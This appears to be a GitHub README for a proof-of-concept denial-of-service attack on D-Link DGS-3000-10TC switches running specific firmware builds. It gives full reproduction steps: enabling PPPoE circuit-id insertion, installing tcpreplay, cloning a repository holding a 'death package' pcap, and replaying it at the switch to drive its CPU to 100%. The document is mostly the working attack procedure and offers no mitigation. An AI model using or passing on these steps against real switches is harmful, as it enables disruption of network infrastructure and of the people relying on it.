# kill-dlink-DGS-3000-10TC-

Initial data:

DGS-3000-10TC
Firmware: Build 4.18.B007
Boot PROM Version          : Build 2.00.001
Firmware Version           : Build 2.05.B009
Hardware Version           : A2
(or Build 2.05.B008)

When a broken pppoed packet comes to the switch - cpu 100% 

1. Enable the function on the switch. The goal is for the switch processor to accept pppoed.
    globally:
    
    	config pppoe circuit_id_insertion state enable
	
     and on any port:
     
     	config pppoe circuit_id_insertion ports 1 state enable
	
2. Install tcpreplay

	for example in debian:
	
	apt install tcpreplay

3. Get a death package

    [git clone https://github.com/MakselPr/kill-dlink-DGS-3000-10TC.git
    

4. Run the command:

     cd kill-dlink-DGS-3000-10TC
     
     tcpreplay  -i eth1 death_package.pcap
     
	where eth1 this is the network card connected to the switch



Thank you.
